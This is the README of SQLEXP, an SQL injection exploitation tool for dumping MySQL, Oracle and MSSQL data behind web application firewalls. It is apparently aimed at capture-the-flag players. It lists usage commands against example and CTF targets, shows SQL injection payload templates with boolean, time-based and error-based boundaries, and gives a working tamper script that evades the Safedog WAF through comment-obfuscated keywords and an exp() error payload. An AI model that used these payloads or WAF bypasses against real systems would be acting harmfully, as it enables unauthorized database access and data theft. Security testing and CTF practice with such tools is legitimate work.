# SQLEXP
[![Python 2.7](https://img.shields.io/badge/python-2.7-yellow.svg)](https://www.python.org/)[![License](https://img.shields.io/badge/license-GPLv3-red.svg)](https://github.com/ggg4566/SQLEXP/blob/master/LICENSE)

​		SQL 注入利用工具，存在waf的情况下自定义编写tamper脚本 dump数据.

​		对于SQL注入漏洞利用通常情况下我们使用SQLMAP，在waf存在的场景下想利用自己独有的payload进行注入抓取数据，这个时候SQLMAP就显得那么力不存心，这种情况并不少见，对于ctfer来说经常会遇到，每次都要重复编写脚本对于一个IT人士来说显然不可接受。该工具正是解决waf存在场景下利用SQLMAP dump数据的难题，使用方法和SQLMAP基本相同，只要你会使用SQLMAP那么该工具上手非常容易.

![image-20200427175012921](https://raw.githubusercontent.com/ggg4566/SQLEXP/master/images/image-20200427175012921.png)

**使用手册：**

​		使用方法和SQLmap类似，仅仅实现了mysql、oracle、mssql,支持[U|E|B|T]四种方式的注入。

* 该工具仅仅是用来利用SQL注入漏洞，并不支持检测
* 只实现了最基本的数据dump功能并不能像SQLMAP一样--os-shell以及其他用法
* 从request 文件里面加载利用注入点插入$\*$ ```id=1$*$&submit=submit```

---

```
Usage: python SQLEXP.py [options]

Options:
  -h, --help  show this help message and exit
Usage: python SQLEXP.py [options]

Options:
  -h, --help            show this help message and exit
  -v, --version         Show program's version number and exit

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")

  Request:
    These options can be used to specify how to connect to the target URL

    --method=METHOD     Force usage of given HTTP method (e.g. GET|POST)
    --data=DATA         Data string to be sent through POST
    --cookie=COOKIE     HTTP Cookie header value
    --proxy=PROXY       Use a proxy to connect to the target URL,only can use
                        http proxy:[http://127.0.0.1:8080]
    --timeout=TIMEOUT   Seconds to wait before timeout connection
    --delay=DELAY_TIME  dbms delay timeout

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p PARAMETER        Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value
    --technique=TECH    SQL injection techniques to use (default "E")
    --string=FLAG       String to match when query is evaluated to True
    --time-sec=TIME_SEC
                        Seconds to wait before timeout connection
    --order-sec=ORDER_SEC
                        Resulting page URL searched for second-order response
    --tamper=TAMPER     Use given script(s) for tampering injection data
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --dump              Dump DBMS database table entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Misc:
    These options can be show some additional function.

    --debug             show deubg payload.
    
 Example: 
 list dbs:
#python SQLEXP.py -u "http://test.com/bypass
_sql/sqlinject.php?id=1" -p id --dbms mysql --dbs --tech U
 list tables:
#python SQLEXP.py -u "http://test.com/bypass
_sql/sqlinject.php?id=1" -p id --dbms mysql -D test --tables --tech U --proxy http://127.0.0.1:8080
 dump test db data:
#python SQLEXP.py -u "http://test.com/bypass
_sql/sqlinject.php?id=1" -p id --dbms mysql -D test --dump --tech E
#python SQLEXP.py -u "http://web.jarvisoj.com:32787/login.php" --data="username=user&password=admin" -p username --tamper=tamper_blank --dbms=mysql --technique=B --string="密码错误" --method=post  --dbs
#python SQLEXP.py-u http://localhost/sqlinject/sqlinject.php?id=2  -r req.txt --dbms mysql --tech E  --current-user  --debug
```

**开发手册：**

---

* 二次开发

工具设计思想借鉴了SQLMAP整个payload由boundary和基本查询query构成

![image-20200427183437621](https://raw.githubusercontent.com/ggg4566/SQLEXP/master/images/image-20200427183437621.png)

为了方便扩展添加支持其他数据库，构造语句和payload高度分离，不同数据库不同注入方法使用单独一个文件编写，由于对数据库基本查询能力进行了高度抽象化，所以添加支持其他数据引擎非常容易，只需要copy一份已经支持的数据库代码文件，在payload.py里面添加相对应的boundary和 base query即可。

​		比如添加支持db2：

​		1.copy -r SQLEXP\lib\core\dbs\mysql SQLEXP\lib\core\dbs\db2

  	  2.在SQLEXP\lib\parse\payload.py文件里面添加对应的代码

```python
db2_boundarys = {
    "length":"and len(%query)=%value",
    "time_length":"if(len(%query)>%value) WAITFOR DELAY '0:0:{T}'".format(T = conf.time_sec),
    ....
}
db2_payloads = {
    "query":"(select %s from t_n)",
    "base_query":"(select temp from (select ROW_NUMBER() OVER(order by (select 0)) AS limit,(%s) as temp from t_n)xx where limit=%d)",
    "query_tab":"(select tn from (select  ROW_NUMBER() OVER(order by (select 0)) AS limit,(%s) as tn from {db}.t_n)xx where limit=%d)",
    ...
}
....
if conf.dbms == 'db2':
    BOUNDARY.update(mssql_boundarys)
    SQL.update(mssql_payloads)
```

​	一定注意的的是这里创建的数据库文件夹和py文件名和--dbms参数联系紧密，程序运行的时候通过--dbms的参数来决定加载那个数据库引擎的代码，所以--dbms=db2的时候，db2/db2_E.py、db2/db2_U.py等文件一定要存在。

![image-20200427185702838](https://raw.githubusercontent.com/ggg4566/SQLEXP/master/images/image-20200427185702838.png)

![image-20200427185838021](https://raw.githubusercontent.com/ggg4566/SQLEXP/master/images/image-20200427185838021.png)

* Tamper编写

  tamper主要针对waf存在场景下的数据dump.

  编写非常简单只要将bounday和query替换为自己测试绕过的语句即可,以下为最新safedog的绕过tamper

  ```python
  #! /usr/bin/env python
  # -*- coding:utf-8 -*-
  # author:flystart
  # home:www.flystart.org
  
  b = " xor exp(~(/*!50000select*/*from(select(%query))a))"
  
  def do(strings):
      if "concat" in strings:
          strings = strings.replace('concat(',"/*!concat*/(")
      if "user" in strings:
          strings = strings.replace('user(',"/*!user*/(")
      strings = strings.replace(' and ', "&&")
      return strings
  def tamper(boundary,query):
      # print 'tamper'
      boundary = b
      query = do(query)
      return boundary,query
  ```

  ![image-20200427190147278](https://raw.githubusercontent.com/ggg4566/SQLEXP/master/images/image-20200427190147278.png)

**参考：**

https://github.com/shack2/SuperSQLInjectionV1

https://github.com/sqlmapproject/sqlmap